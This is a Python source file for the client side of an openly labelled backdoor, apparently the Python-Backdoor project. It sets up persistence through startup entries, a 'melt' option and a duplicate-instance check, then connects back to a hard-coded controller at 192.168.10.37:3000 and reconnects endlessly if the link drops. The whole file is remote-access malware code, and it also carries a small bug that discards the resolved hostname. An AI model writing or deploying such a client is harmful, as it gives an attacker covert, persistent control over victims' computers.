"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

import socket
import sys

from src import errors
from src.client import persistence
from src.client.socket import Socket
import logger


class Client:
    def __init__(self, host, port, is_host_name=False, add_to_startup=False, melt=False):
        logger.init()

        self.socket = None

        if is_host_name:
            self.host = socket.gethostbyname(host)
        else:
            self.host = host

        self.host = host
        self.port = port

        if persistence.is_duplicate_instance():
            sys.exit(0)

        if melt:
            persistence.melt()

        if add_to_startup:
            try:
                persistence.add_startup()
            except errors.ClientSocket.Persistence.StartupError:
                pass

    def start(self):
        self.socket = Socket(self.host, self.port)

        try:
            self.socket.connect()
        except socket.error:  # if the server closes without warning
            self.socket.close()
            del self.socket
            self.start()


if __name__ == "__main__": Client('192.168.10.37', 3000, False, False, False).start()